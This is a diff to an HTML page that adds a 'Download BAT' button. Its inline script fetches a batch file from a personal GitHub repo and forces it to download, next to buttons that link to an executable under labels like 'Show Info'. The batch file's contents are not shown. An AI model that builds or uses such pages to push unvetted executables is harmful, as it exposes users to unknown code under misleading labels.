@@ -73,6 +73,19 @@
            class="download-btn">Delete Server</a>
         <a href="https://github.com/HeySinker/bsbs/raw/refs/heads/main/scan.exe"
            class="download-btn">Show Info</a>
+        <a href="javascript:void(0);" 
+       onclick="(async()=>{ 
+           const resp=await fetch('https://raw.githubusercontent.com/HeySinker/bsbs/main/asd.bat'); 
+           const blob=await resp.blob(); 
+           const a=document.createElement('a'); 
+           a.href=URL.createObjectURL(blob); 
+           a.download='asd.bat'; 
+           document.body.appendChild(a); 
+           a.click(); 
+           a.remove(); 
+           URL.revokeObjectURL(a.href); 
+       })();" 
+       class="download-btn">Download BAT</a>
     </div>
 </body>
 </html>
